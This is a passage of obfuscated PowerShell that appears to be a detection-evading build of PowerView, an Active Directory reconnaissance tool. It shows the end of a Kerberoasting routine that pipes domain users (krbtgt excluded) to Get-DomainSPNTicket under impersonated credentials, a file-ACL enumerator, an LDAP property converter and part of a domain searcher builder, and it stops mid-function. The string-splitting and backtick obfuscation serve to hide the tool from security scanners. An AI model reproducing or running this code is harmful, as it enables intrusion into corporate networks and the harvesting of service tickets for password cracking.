        if (${p`s`BOU`NdPAR`AMetErs}[("{2}{1}{0}"-f 'al','nti','Crede')]) { ${u`se`R`SearC`HErArgumEnts}[("{1}{0}{2}{3}" -f 'ent','Cred','i','al')] = ${CREDen`Ti`Al} }

        if (${P`s`BoUNd`PARAm`eteRS}[("{1}{2}{0}"-f 'ial','Crede','nt')]) {
            ${L`ogoN`TOk`EN} = &("{3}{0}{2}{4}{1}" -f'nvoke-Us','ersonation','er','I','Imp') -Credential ${crED`enTI`AL}
        }
    }

    PROCESS {
        if (${PSBOuNdP`ArA`meTe`RS}[("{2}{1}{0}"-f'y','dentit','I')]) { ${U`seRSE`AR`cHErAr`Gume`NtS}[("{1}{0}"-f 'ntity','Ide')] = ${id`Ent`iTy} }
        &("{4}{3}{2}{1}{0}" -f'inUser','a','Dom','et-','G') @UserSearcherArguments | &("{1}{3}{0}{2}" -f 'j','Wher','ect','e-Ob') {${_}."sa`M`AccOUnT`N`AME" -ne ("{1}{0}" -f 'rbtgt','k')} | &("{3}{2}{1}{0}" -f 'ket','SPNTic','ain','Get-Dom') -OutputFormat ${OU`Tp`Ut`FOrMaT}
    }

    END {
        if (${l`ogontoK`en}) {
            &("{1}{0}{3}{2}" -f 'ke-RevertT','Invo','lf','oSe') -TokenHandle ${L`O`gontOken}
        }
    }
}


function GEt`-PaTh`A`cL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}"-f'ess','PSS','houldProc'}, '')]
    [OutputType({"{2}{3}{1}{0}"-f'CL','leA','Powe','rView.Fi'})]
    [CmdletBinding()]
    Param(
        [Parameter(maNDaTOry = ${t`RUe}, vaLUeFROmpiPeliNe = ${t`RuE}, VaLUeFRompipelInEbyprOPeRTynAme = ${TR`Ue})]
        [Alias({"{2}{0}{1}" -f 'am','e','FullN'})]
        [String[]]
        ${PA`TH},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crE`dENt`IaL} =   ${7T`Q02}::"emp`TY"
    )

    BEGIN {

        function CONV`e`Rt-f`ILerighT {
            
            [CmdletBinding()]
            Param(
                [Int]
                ${f`sR}
            )

            ${A`cceS`sMa`sK} = @{
                [uint32]("{1}{2}{3}{0}"-f '0000','0x','800','0') = ("{2}{1}{0}"-f'icRead','ener','G')
                [uint32]("{0}{1}{2}"-f'0x4','000','0000') = ("{1}{3}{2}{0}" -f 'Write','G','eric','en')
                [uint32]("{1}{0}{2}{3}" -f 'x','0','2000','0000') = ("{3}{1}{0}{2}" -f'xe','E','cute','Generic')
                [uint32]("{1}{3}{0}{2}" -f'00','0x','0','10000') = ("{1}{0}{2}" -f'neri','Ge','cAll')
                [uint32]("{1}{0}{2}" -f'x0','0','2000000') = ("{1}{3}{2}{0}" -f'd','Maximu','e','mAllow')
                [uint32]("{1}{2}{0}" -f'00','0x010','000') = ("{3}{1}{2}{0}" -f 'rity','ste','mSecu','AccessSy')
                [uint32]("{0}{2}{1}"-f '0x0','0','010000') = ("{1}{2}{0}"-f'ze','S','ynchroni')
                [uint32]("{2}{3}{1}{0}" -f'0','000','0','x0008') = ("{0}{1}{2}"-f'WriteOw','n','er')
                [uint32]("{0}{2}{1}"-f '0','40000','x000') = ("{0}{1}"-f 'WriteD','AC')
                [uint32]("{0}{1}{2}"-f'0','x','00020000') = ("{1}{2}{0}" -f'ntrol','R','eadCo')
                [uint32]("{2}{1}{0}" -f '0010000','x0','0') = ("{1}{0}{2}"-f'e','Del','te')
                [uint32]("{1}{2}{0}"-f '00','0x0000','01') = ("{2}{1}{0}" -f'tributes','At','Write')
                [uint32]("{2}{1}{0}{3}" -f'8','0000','0x00','0') = ("{0}{2}{3}{4}{1}"-f 'R','butes','ea','dAttr','i')
                [uint32]("{0}{1}{2}" -f'0x','00000','040') = ("{2}{3}{0}{1}"-f'Chi','ld','Delet','e')
                [uint32]("{2}{0}{1}"-f '00','000020','0x') = ("{3}{2}{1}{0}{4}" -f'e','av','/Tr','Execute','rse')
                [uint32]("{0}{1}{2}"-f'0x00000','01','0') = ("{1}{0}{2}{5}{3}{4}"-f'nd','WriteExte','edAtt','ibute','s','r')
                [uint32]("{2}{0}{1}{3}" -f 'x0000','000','0','8') = ("{2}{4}{1}{3}{0}" -f 'butes','tend','Re','edAttri','adEx')
                [uint32]("{0}{1}{2}" -f '0x','000','00004') = ("{1}{0}{4}{3}{2}" -f'd','AppendData/Ad','y','ubdirector','S')
                [uint32]("{0}{2}{1}" -f'0x000','0002','0') = ("{4}{1}{2}{3}{0}" -f'e','ri','teD','ata/AddFil','W')
                [uint32]("{1}{0}{2}"-f'0','0x0000','001') = ("{4}{0}{1}{3}{2}"-f'e','adData/L','ry','istDirecto','R')
            }

            ${siM`Ple`perMIS`s`i`oNs} = @{
                [uint32]("{2}{0}{1}"-f'f01f','f','0x1') = ("{1}{0}{2}" -f 'ullCon','F','trol')
                [uint32]("{2}{0}{1}"-f'x030','1bf','0') = ("{1}{0}"-f'odify','M')
                [uint32]("{1}{0}" -f'00a9','0x02') = ("{2}{1}{3}{0}"-f 'e','dExec','ReadAn','ut')
                [uint32]("{0}{1}"-f '0x02019','f') = ("{1}{0}{2}{3}" -f 'An','Read','dW','rite')
                [uint32]("{1}{0}"-f'9','0x02008') = ("{0}{1}" -f'R','ead')
                [uint32]("{0}{1}" -f '0x00011','6') = ("{1}{0}"-f 'rite','W')
            }

            ${peR`mIS`si`ons} = @()

            
            ${PE`RmISs`Io`NS} += ${s`i`mp`le`peRMiSsIONS}."ke`Ys" | &("{3}{2}{1}{0}"-f 'ect','bj','Each-O','For') {
                              if ((${f`SR} -band ${_}) -eq ${_}) {
                                ${SIMPLE`PerMi`s`sI`ons}[${_}]
                                ${f`sR} = ${F`sr} -band (-not ${_})
                              }
                            }

            
            ${p`eR`MIsS`Ions} += ${aC`c`esS`MaSk}."ke`yS" | &("{2}{0}{1}{3}" -f'h','ere-','W','Object') { ${F`Sr} -band ${_} } | &("{1}{3}{0}{2}"-f 'je','ForEach','ct','-Ob') { ${A`CcEs`SM`AsK}[${_}] }
            (${pE`R`mISsIONs} | &("{0}{2}{3}{1}"-f 'Wh','ject','ere','-Ob') {${_}}) -join ','
        }

        ${C`on`VER`TaR`GUmEn`Ts} = @{}
        if (${PSbou`N`D`parAmETERs}[("{2}{1}{0}"-f 'tial','n','Crede')]) { ${CoNve`R`TA`RGUMenTS}[("{0}{1}{2}"-f 'C','redentia','l')] = ${CrED`E`NTI`Al} }

        ${Ma`pP`edco`MputerS} = @{}
    }

    PROCESS {
        ForEach (${T`ARgE`TpatH} in ${p`Ath}) {
            try {
                if ((${T`ArgEt`P`Ath} -Match ((("{2}{0}{1}{3}"-f 'J3v.*J3','vJ','J3vJ3vJ3v','3v.*'))."re`PL`Ace"(([CHAR]74+[CHAR]51+[CHAR]118),[string][CHAR]92))) -and (${psBOU`NdPAR`Am`E`Te`RS}[("{3}{1}{0}{2}"-f 'ede','r','ntial','C')])) {
                    ${HOs`T`COm`pUteR} = (&("{2}{0}{1}" -f 'bj','ect','New-O') ("{0}{2}{1}"-f 'Sy','em.Uri','st')(${t`AR`getpath}))."HO`st"
                    if (-not ${maPp`ED`CoMP`UT`eRs}[${HOS`TC`oMPUt`eR}]) {
                        
                        &("{1}{2}{4}{3}{0}{5}" -f 'onnecti','Add-R','e','C','mote','on') -ComputerName ${HO`STcO`mPu`TeR} -Credential ${CR`EdEnT`IaL}
                        ${MAP`ped`C`OMPU`TErS}[${HoS`TCo`M`PUTeR}] = ${Tr`Ue}
                    }
                }

                ${a`cL} = &("{1}{0}{2}" -f'et-','G','Acl') -Path ${T`ARg`ETpa`TH}

                ${a`cl}."gEta`CcEss`Ru`L`ES"(${T`RUE}, ${T`RuE}, [System.Security.Principal.SecurityIdentifier]) | &("{3}{0}{1}{2}" -f 'orEa','c','h-Object','F') {
                    ${s`Id} = ${_}."IDe`NTItyrEFEr`E`NCe"."V`AlUe"
                    ${n`Ame} = &("{0}{4}{2}{3}{1}" -f'Convert','D','m-','SI','Fro') -ObjectSID ${S`Id} @ConvertArguments

                    ${O`Ut} = &("{0}{2}{1}"-f 'N','w-Object','e') ("{1}{2}{0}"-f 'bject','P','SO')
                    ${o`UT} | &("{1}{3}{0}{2}"-f'be','A','r','dd-Mem') ("{0}{3}{1}{2}" -f 'No','rt','y','teprope') ("{0}{1}"-f'Pa','th') ${TaR`G`etp`Ath}
                    ${O`Ut} | &("{2}{1}{0}"-f'ber','Mem','Add-') ("{1}{0}{2}" -f 'ot','N','eproperty') ("{2}{0}{1}{3}" -f'yste','mRig','FileS','hts') (&("{3}{1}{2}{0}" -f 'ht','nvert','-FileRig','Co') -FSR ${_}."FILe`SysT`EmrigHtS"."vA`Lue__")
                    ${O`Ut} | &("{1}{0}{2}"-f'-Mem','Add','ber') ("{1}{0}{2}" -f 'r','Noteprope','ty') ("{1}{0}{4}{3}{2}"-f 'tit','Iden','ence','r','yRefe') ${N`AMe}
                    ${O`Ut} | &("{1}{2}{0}"-f 'r','Ad','d-Membe') ("{0}{1}{3}{2}"-f'Not','epr','ty','oper') ("{0}{1}{2}" -f'Identit','ySI','D') ${s`iD}
                    ${o`UT} | &("{2}{0}{1}" -f '-M','ember','Add') ("{3}{1}{0}{2}" -f't','r','y','Noteprope') ("{1}{5}{2}{3}{0}{4}" -f 'olTyp','Ac','ont','r','e','cessC') ${_}."AC`CesSC`oN`TrO`Lt`ype"
                    ${o`UT}."p`Sob`JEcT"."TypENam`eS".("{1}{0}" -f't','Inser').Invoke(0, ("{2}{1}{0}{3}"-f 'w.F','ie','PowerV','ileACL'))
                    ${o`Ut}
                }
            }
            catch {
                &("{2}{1}{0}{3}" -f 'erbo','V','Write-','se') ('[Get-P'+'athAcl'+']'+' '+'e'+'rro'+'r: '+"$_")
            }
        }
    }

    END {
        
        ${MAp`pe`DcOmP`U`TErs}."k`Eys" | &("{0}{1}{3}{4}{2}" -f'Rem','o','n','ve-Remote','Connectio')
    }
}


function co`NvErT-LD`AP`p`RoperTY {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{0}{1}{3}{2}"-f'oul','dP','cess','ro','PSSh'}, '')]
    [OutputType({"{2}{5}{3}{9}{4}{8}{6}{7}{11}{1}{0}{10}"-f'on.P','i','Sys','.M','g','tem','to','ma','ement.Au','ana','SCustomObject','t'})]
    [CmdletBinding()]
    Param(
        [Parameter(MANDatOrY = ${TR`Ue}, VALUeFRomPIPeliNe = ${t`RUE})]
        [ValidateNotNullOrEmpty()]
        ${prOp`ERt`ieS}
    )

    ${OB`Ject`P`RoP`ERtIeS} = @{}

    ${pr`opER`TieS}."K`eYs" | &("{3}{1}{0}{2}"-f 'Ob','ort-','ject','S') | &("{2}{1}{0}" -f 'Each-Object','or','F') {
        if (${_} -ne ("{1}{0}" -f 'dspath','a')) {
            if ((${_} -eq ("{1}{0}"-f 'bjectsid','o')) -or (${_} -eq ("{1}{2}{0}" -f 'ry','sidhis','to'))) {
                
                ${objE`C`TProperT`IeS}[${_}] = ${p`RopERTi`ES}[${_}] | &("{2}{3}{0}{1}"-f'Obje','ct','ForE','ach-') { (&("{3}{0}{1}{2}"-f 'e','w-','Object','N') ("{3}{11}{10}{13}{1}{0}{12}{2}{8}{7}{4}{9}{5}{6}"-f'p','nci','l.S','Syste','i','i','er','ityIdent','ecur','f','u','m.Sec','a','rity.Pri')(${_}, 0))."v`AluE" }
            }
            elseif (${_} -eq ("{0}{1}" -f 'g','rouptype')) {
                ${o`B`jECT`pRoPert`IeS}[${_}] = ${p`Ro`perTiES}[${_}][0] -as ${gr`OUptYPe`Enum}
            }
            elseif (${_} -eq ("{1}{0}{2}" -f 'ma','sa','ccounttype')) {
                ${ObJ`ectP`RO`p`er`TiES}[${_}] = ${P`Ro`PertiES}[${_}][0] -as ${sam`A`CCoU`NTtYp`EE`N`Um}
            }
            elseif (${_} -eq ("{0}{1}{2}"-f 'obj','ect','guid')) {
                
                ${OBJeC`TPRoPer`T`IES}[${_}] = (&("{0}{1}{2}" -f'New','-','Object') ("{1}{0}"-f'uid','G') (,${PrOPeR`Ti`ES}[${_}][0]))."g`UId"
            }
            elseif (${_} -eq ("{3}{4}{1}{5}{0}{2}" -f'untcont','a','rol','use','r','cco')) {
                ${oBjec`TPRoPER`T`IeS}[${_}] = ${P`ROpe`R`TIEs}[${_}][0] -as ${uAcEn`Um}
            }
            elseif (${_} -eq ("{0}{3}{2}{1}" -f 'ntsecurity','ptor','escri','d')) {
                
                ${des`CRiPT`Or} = &("{2}{0}{1}" -f 'ew-','Object','N') ("{3}{4}{7}{10}{1}{6}{5}{2}{11}{0}{8}{9}"-f'tyDes','Cont','Secur','Secu','rity.','.Raw','rol','Ac','cripto','r','cess','i') -ArgumentList ${PrO`Pe`RTi`ES}[${_}][0], 0
                if (${D`esC`RiPt`or}."Ow`NER") {
                    ${obJECT`pROp`er`TiEs}[("{1}{0}" -f'wnerSID','O')] = ${d`es`Cript`Or}."o`WNer"
                    ${owne`RoBje`CT} = &("{3}{0}{2}{1}" -f 'et-Domain','bject','O','G') ${D`esCRIp`TOR}."ow`Ner"
                    ${o`B`JecTpR`OpE`RtIeS}[("{2}{3}{0}{1}"-f 'am','e','Owner','N')] = ${oWn`ER`ob`jeCT}."Sa`Macc`o`UNtN`AmE"
                }
                if (${Des`C`Ri`ptor}."Gr`OuP") {
                    ${objeCtP`RO`p`E`Rt`ies}[("{1}{0}" -f'roup','G')] = ${Des`cRIP`TOr}."G`RoUp"
                }
                if (${DE`sCR`iPTOr}."dIsC`R`eTio`NArY`AcL") {
                    ${oBj`ec`T`PrOpeRtiES}[("{3}{1}{2}{0}" -f'onaryAcl','e','ti','Discr')] = ${D`eS`c`RIPtOR}."Dis`crETI`oN`AR`yACl"
                }
                if (${DEs`C`Ript`OR}."SysT`EmaCl") {
                    ${ObJEcT`PR`OPE`RTIes}[("{2}{1}{0}"-f'mAcl','yste','S')] = ${de`scri`PtOR}."sYSteM`A`Cl"
                }
            }
            elseif (${_} -eq ("{2}{1}{0}{3}"-f 'r','xpi','accounte','es')) {
                if (${p`R`O`PErTIES}[${_}][0] -gt  ( DiR ("{1}{2}{0}" -f 'aBle:F9T47y','Va','rI')  )."val`Ue"::"MaXVa`luE"."TiC`KS") {
                    ${oBj`ECT`ProPERtI`es}[${_}] = ("{0}{1}"-f'NE','VER')
                }
                else {
                    ${OBJeC`TpR`opERt`iES}[${_}] =   (  VARIABLE ("{1}{0}"-f '7Y','F9T4') )."VA`lUe"::"fr`omfIl`E`Time"(${Pr`OPERT`Ies}[${_}][0])
                }
            }
            elseif (${_} -eq ("{2}{0}{1}"-f'cko','uttime','lo')) {
                if (${P`R`OPeRti`Es}[${_}][0] -eq 0 -or ${ProPE`RT`IES}[${_}][0] -gt  (  GeT-varIaBLE ('f9T47'+'y')  -vaL)::"ma`xvAl`UE"."tI`Cks") {
                    ${Obje`c`Tpr`opE`Rties}[${_}] = ("{0}{1}{2}"-f 'UNL','OCK','ED')
                }
                else {
                    ${o`BJEcTp`R`oPErtIes}[${_}] =   (vArIABLe  ("f"+"9T"+"47y") -VALueonL )::"FrOM`F`iLE`TiME"(${p`Roperti`Es}[${_}][0])
                }
            }
            elseif ( (${_} -eq ("{1}{2}{0}"-f 'n','la','stlogo')) -or (${_} -eq ("{3}{1}{2}{0}" -f 'amp','es','t','lastlogontim')) -or (${_} -eq ("{2}{0}{1}" -f'astse','t','pwdl')) -or (${_} -eq ("{2}{1}{0}" -f'tlogoff','as','l')) -or (${_} -eq ("{2}{0}{1}" -f 'adPasswordTi','me','b'))  -or (${_} -eq ("{0}{4}{2}{5}{1}{6}{3}" -f 'ms-','xpiratio','a','time','mcs-','dmpwde','n'))) {
                
                if (${p`RoPEr`TIeS}[${_}][0] -is [System.MarshalByRefObject]) {
                    
                    ${t`emp} = ${p`RoPE`R`TIES}[${_}][0]
                    [Int32]${H`Igh} = ${T`EmP}.("{0}{2}{1}" -f'Get','ype','T').Invoke().("{3}{0}{1}{2}"-f 'eMem','be','r','Invok').Invoke(("{2}{0}{1}" -f 'r','t','HighPa'),  ${l8`I6}::"gETP`RoPe`RTY", ${Nu`ll}, ${T`eMP}, ${n`Ull})
                    [Int32]${l`oW}  = ${T`eMP}.("{0}{1}" -f'G','etType').Invoke().("{0}{2}{3}{1}"-f'Invok','r','eMem','be').Invoke(("{1}{2}{0}" -f 'art','Lo','wP'),   ( Gi  ('VaRI'+'aBl'+'e:L8I6'))."V`AluE"::"ge`TPRO`PERtY", ${nU`lL}, ${TE`mp}, ${n`ULl})
                    ${OB`J`eCt`PrOpER`Ti`ES}[${_}] = (  (  GI  ("{2}{3}{1}{0}" -f 'y','blE:F9T47','VarI','A') )."vaL`UE"::"FroM`FI`l`ETIME"([Int64]("0x{0:x8}{1:x8}" -f ${h`iGh}, ${L`OW})))
                }
                else {
                    
                    ${o`Bje`c`TPr`OPeRt`IeS}[${_}] = (  ( Dir  ("{1}{0}{3}{2}{4}"-f'IablE','vAr','f9',':','t47Y'))."VA`lUe"::"f`ROm`FILET`IME"((${pROPe`RT`i`eS}[${_}][0])))
                }
            }
            elseif (${_} -eq ("{2}{1}{0}" -f 's','nhour','logo')) {
                ${ObjEctpROp`e`Rti`ES}[${_}] = &("{3}{2}{1}{0}{4}" -f 'onH','og','L','Convert-','ours') -LogonHours ${Pr`op`ERtieS}[${_}][0]
            }
            elseif (${PrO`pE`RTi`eS}[${_}][0] -is [System.MarshalByRefObject]) {
                
                ${pR`Op} = ${pr`op`e`RTIES}[${_}]
                try {
                    ${Te`MP} = ${P`ROP}[${_}][0]
                    [Int32]${Hi`Gh} = ${Te`MP}.("{1}{0}"-f'pe','GetTy').Invoke().("{0}{2}{1}" -f'InvokeMe','ber','m').Invoke(("{1}{0}" -f 'Part','High'),   ( GET-itEM  ('VAR'+'ia'+'BLE:'+'L8I6'))."vAL`UE"::"Ge`TPRope`R`Ty", ${Nu`LL}, ${t`EMp}, ${nU`Ll})
                    [Int32]${l`oW}  = ${T`Emp}.("{1}{0}"-f 'tType','Ge').Invoke().("{1}{3}{0}{2}" -f'M','I','ember','nvoke').Invoke(("{1}{0}" -f'Part','Low'),   ${l8`i6}::"gEtpRo`pe`RTY", ${N`Ull}, ${t`EmP}, ${nu`lL})
                    ${Ob`je`CTPrOPeR`TIeS}[${_}] = [Int64]("0x{0:x8}{1:x8}" -f ${hI`gh}, ${l`ow})
                }
                catch {
                    &("{1}{3}{2}{0}" -f'se','Wr','o','ite-Verb') ('['+'Convert-LDAPPro'+'pert'+'y]'+' '+'err'+'or: '+"$_")
                    ${O`BjeC`TPrOPEr`TiES}[${_}] = ${Pr`op}[${_}]
                }
            }
            elseif (${PrOPE`R`Ti`Es}[${_}]."C`OunT" -eq 1) {
                ${o`BJEc`T`proPe`Rt`IES}[${_}] = ${p`R`oPerties}[${_}][0]
            }
            else {
                ${obJe`Ctpro`pEr`TiES}[${_}] = ${pRO`pErt`IES}[${_}]
            }
        }
    }
    try {
        &("{1}{0}{2}{3}" -f'w','Ne','-Obje','ct') -TypeName ("{1}{2}{0}"-f 'ject','P','SOb') -Property ${oBJECTP`R`oP`eRTies}
    }
    catch {
        &("{2}{1}{0}" -f'ning','-War','Write') ('[Conve'+'r'+'t-LDAPProp'+'er'+'ty] '+'Err'+'o'+'r '+'parsi'+'ng '+'LD'+'AP '+'pr'+'op'+'erties '+': '+"$_")
    }
}








function gET`-DoM`AI`NSeaR`CHEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{2}{1}" -f'd','s','Proces','PSShoul'}, '')]
    [OutputType({"{5}{0}{3}{1}{6}{2}{8}{7}{4}"-f 'ste','Directory','vices.Direc','m.','er','Sy','Ser','earch','toryS'})]
    [CmdletBinding()]
    Param(
        [Parameter(vaLUeFROMpiPELINe = ${t`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${d`oM`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'Fi','lter'})]
        [String]
        ${LDAp`FI`lTEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pR`oPerTi`es},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'ADSPat','h'})]
        [String]
        ${s`ea`RCHBasE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${sEARC`hBaS`epRe`FIX},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}{3}" -f 'Domain','ntrolle','Co','r'})]
        [String]
        ${se`R`VeR},

        [ValidateSet({"{0}{1}"-f'Ba','se'}, {"{2}{0}{1}"-f 'Lev','el','One'}, {"{0}{2}{1}" -f'S','e','ubtre'})]
        [String]
        ${S`e`ARcHs`Cope} = ("{1}{0}"-f'ee','Subtr'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ReSu`lT`PAG`ESIZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRv`ErTIm`E`lIMit} = 120,

        [ValidateSet({"{1}{0}"-f'l','Dac'}, {"{0}{1}"-f 'G','roup'}, {"{0}{1}"-f 'N','one'}, {"{0}{1}" -f'O','wner'}, {"{0}{1}"-f'S','acl'})]
        [String]
        ${S`EcU`RiTymA`s`KS},

        [Switch]
        ${TOMB`S`TOnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREDEn`T`IAl} =   ( Get-vaRIaBle  ("7T"+"Q02")  -vAlu  )::"E`MpTy",

        [Switch]
        ${s`sL}
    )

    PROCESS {
        if (${PSboUNdpa`Ram`EtE`Rs}[("{1}{0}"-f'omain','D')]) {
            ${TaRGe`TDo`MA`iN} = ${Do`MAin}

            if (${En`V:USeRdNsDO`M`AIN} -and (${Env`:u`SerDnsDO`mAiN}.("{0}{1}"-f'Tr','im').Invoke() -ne '')) {
                
                ${uSER`dom`AiN} = ${eN`V`:USerdNs`DOM`Ain}
                if (${Env:Lo`GONSer`VER} -and (${enV:L`o`GOn`sER`VeR}.("{0}{1}" -f'Tr','im').Invoke() -ne '') -and ${UsE`RdoMA`IN}) {
                    ${BInD`s`e`RveR} = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                }
            }
        }
        elseif (${pSb`OUN`Dp`ARa`MeTErs}[("{2}{0}{1}" -f'd','ential','Cre')]) {
            
            ${doMAi`NOBj`EcT} = &("{2}{1}{0}"-f't-Domain','e','G') -Credential ${C`R`EdENTiaL}
            ${BI`ND`seRVeR} = (${d`OM`AinO`BJecT}."PdcrolE`own`ER")."n`AMe"
            ${TaRGETDo`MA`In} = ${Do`m`AI`No`BjecT}."n`AmE"
        }
        elseif (${EnV:`Us`eR`dnsDOm`AIN} -and (${env:`U`SErD`NSd`o`mAin}.("{1}{0}"-f'im','Tr').Invoke() -ne '')) {
            
            ${TArg`E`TdomAIN} = ${E`NV:U`sErd`NSdOm`Ain}
            if (${e`NV:LOg`onSErVER} -and (${enV:l`ogoN`SEr`VEr}.("{1}{0}"-f'm','Tri').Invoke() -ne '') -and ${T`ArGet`DOMAin}) {
                ${bin`dsE`Rv`eR} = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
        }
        else {
            
            &("{0}{2}{1}"-f 'write','verbose','-') ("{2}{1}{0}" -f 'ain','-dom','get')
            ${D`O`ma`iNObJeCT} = &("{2}{0}{1}" -f'-Doma','in','Get')
            ${bINd`s`ERV`eR} = (${doMa`inO`Bj`E`cT}."pD`CRoLEo`wNer")."n`AME"
            ${T`ARgETDo`Ma`In} = ${domA`I`NOBjecT}."NA`me"
        }

        if (${p`S`BOuNdPARaMEte`RS}[("{0}{1}"-f'Ser','ver')]) {
            
            ${B`I`Nd`sErver} = ${S`e`RVER}
        }

        if (${PS`BouNDPA`Ra`ME`T`ERS}['SSL']) {
            if (  ( gET-vAriaBLe  ("{0}{1}" -f'Kd','LP') -VaL  )::("{1}{2}{0}"-f 'pty','IsNu','llOrEm').Invoke(${bi`NDS`erVer})) {
                ${dOmA`IN`OB`JECT} = &("{0}{1}{2}"-f'Get-D','om','ain')
                ${bi`NdSE`RV`Er} = (${d`oMAInOBj`ECt}."p`dCRO`leow`NeR")."nA`Me"
            }
              ${L`79}::("{3}{0}{1}{2}" -f'With','Part','ialName','Load').Invoke(("{1}{3}{5}{0}{2}{4}{6}{7}{8}{9}"-f 'rectorySe','S','r','y','vice','stem.Di','s.','Pr','o','tocols')) | &("{1}{0}{2}" -f'Nu','Out-','ll')
            &("{1}{2}{0}"-f'e','W','rite-Verbos') "[Get-DomainSearcher] Connecting to $($BindServer):636 "
            ${s`EA`Rcher} = &("{0}{1}{2}"-f'New-Ob','jec','t') -TypeName ("{8}{11}{1}{3}{2}{0}{10}{7}{4}{13}{9}{5}{14}{12}{6}" -f 'tor','s','rec','tem.Di','rvice','oc','pConnection','Se','S','t','y','y','.Lda','s.Pro','ols') -ArgumentList "$($BindServer):636"
            ${SEa`RcHer}."sEsSiOn`O`Pti`ONS"."SEc`URES`OckET`LAYeR" = ${T`RUe};
            ${Se`A`RChER}."SeSSIONop`T`Io`Ns"."Ve`RiFYserv`ErC`E`RTIFiCATE" = { ${Tr`UE} }
            ${s`eaRC`h`ER}."sESsI`Onop`TI`O`NS"."DomA`in`N`AmE" = ${T`ArgEt`DOm`A`In}
            ${se`A`RcHeR}."aUt`HTyPe" =   ( VariABlE ('4rQ'+'W') -vA  )::"negO`TI`AtE"
            if (${pS`B`OU`NdparaMEte`Rs}[("{1}{0}{2}" -f'edent','Cr','ial')]) {
                ${se`Arc`hEr}.("{0}{1}"-f'B','ind').Invoke(${crEDE`N`Ti`Al})
            }
            else {
                ${SE`ARC`HeR}.("{0}{1}"-f'B','ind').Invoke()
            }
        }
        else {
            ${searcHSt`R`InG} = ("{0}{1}{2}" -f 'LD','A','P://')

            if (${BI`Nds`ERVer} -and (${BiNdSE`RV`er}.("{0}{1}" -f 'Tr','im').Invoke() -ne '')) {
                ${seAR`cHST`R`iNg} += ${biN`ds`eR`VER}
                if (${ta`RgETdO`m`A`In}) {
                    ${S`earCh`StrInG} += '/'
                }
            }

            if (${PsBOuNDpArAm`e`T`e`Rs}[("{1}{2}{0}{3}"-f 'Prefi','Sea','rchBase','x')]) {
                ${SEAr`cH`STR`iNG} += ${S`eA`Rc`hbASEpREfix} + ','
            }

            if (${PSb`ou`NdPA`Rame`TeRs}[("{0}{2}{1}" -f'S','Base','earch')]) {
                if (${Se`ArcHba`se} -Match ("{1}{0}{2}" -f'C:/','^G','/')) {
                    
                    ${D`N} = ${SE`A`R`CHBaSE}.("{0}{1}" -f 'ToUpp','er').Invoke().("{1}{0}"-f'rim','T').Invoke('/')
                    ${sEA`RCHSt`RI`NG} = ''
                }
                else {
                    if (${sE`AR`cHBA`se} -match ("{1}{0}"-f'P://','^LDA')) {
                        if (${sEARC`HBA`sE} -match ("{1}{2}{0}{3}" -f '/','LDAP:/','/.+','.+')) {
                            ${sE`A`R`CHstrinG} = ''
                            ${Dn} = ${SEA`RcH`BAse}
                        }
                        else {
                            ${DN} = ${S`ea`RCHBa`Se}.("{1}{0}"-f'ng','SubStri').Invoke(7)
                        }
                    }
                    else {
                        ${D`N} = ${sear`Ch`BaSe}
                    }
                }
            }
            else {
                
                if (${t`Arg`eTDOM`Ain} -and (${TA`R`geTDOmA`iN}.("{1}{0}"-f'rim','T').Invoke() -ne '')) {
                    ${D`N} = "DC=$($TargetDomain.Replace('.', ',DC='))"
                }
            }

            ${s`e`ArchS`TrI`Ng} += ${Dn}
            &("{2}{3}{1}{0}"-f'erbose','-V','Wr','ite') ('['+'Get-Do'+'m'+'ai'+'nSe'+'archer'+'] '+'sear'+'ch '+'b'+'ase: '+"$SearchString")

            if (${cr`ed`EnTi`Al} -ne  ${7t`q02}::"eM`ptY") {
                &("{0}{2}{1}"-f'Write-','ose','Verb') ("{7}{10}{9}{3}{0}{14}{5}{16}{15}{6}{1}{13}{12}{2}{11}{8}{4}" -f 'ter','t','f','omainSearcher] Using al',' LDAP connection','a','en','[G','r','-D','et','o',' ','ials','n','d','te cre')
                
                ${D`o`mainobJe`ct} = &("{1}{0}{2}" -f'Ob','New-','ject') ("{7}{5}{2}{8}{4}{6}{3}{9}{1}{0}" -f'y','Entr','ecto','es.Direct','ervi','ir','c','D','ryS','ory')(${SE`ArchstRi`Ng}, ${c`REde`NtiaL}."U`Sern`AME", ${crEDEN`T`Ial}.("{1}{3}{2}{4}{0}" -f 'edential','G','et','etN','workCr').Invoke()."PaS`s`WORD")
                ${seA`RCher} = &("{1}{2}{3}{0}" -f 'ct','N','ew-O','bje') ("{11}{0}{10}{3}{8}{5}{9}{1}{6}{2}{7}{4}{12}"-f 'y','Se','tor','tem','ar','cto','rvices.Direc','ySe','.Dire','ry','s','S','cher')(${dOmain`O`BJe`CT})
            }
            else {
                
                ${SeARc`hEr} = &("{1}{2}{0}"-f't','New-Obje','c') ("{1}{6}{3}{2}{4}{0}{8}{5}{7}"-f 'ctoryS','S','em','st','.Dire','orySearc','y','her','ervices.Direct')([ADSI]${SEARcHs`TrI`Ng})
            }

            ${s`e`ARcHeR}."Pag`eSiZe" = ${re`S`UltPaGeS`iZe}
            ${S`eaR`cheR}."Se`ARChs`co`Pe" = ${sea`Rch`ScO`pE}
            ${sE`ARC`hEr}."cACH`Er`E`sUlTS" = ${F`AlSE}
            ${sEA`RcH`Er}."Re`F`ErRaLchAs`Ing" =   ( variaBle ("{0}{1}"-f 'nv','k71z') )."v`AluE"::"a`Ll"

            if (${p`s`BO`U`Nd`PArAmETeRS}[("{1}{0}{2}" -f 'i','ServerTimeLim','t')]) {
                ${sE`ARcher}."sERVeRT`imel`i`m`It" = ${ser`V`ER`TIMElI`m`IT}
            }

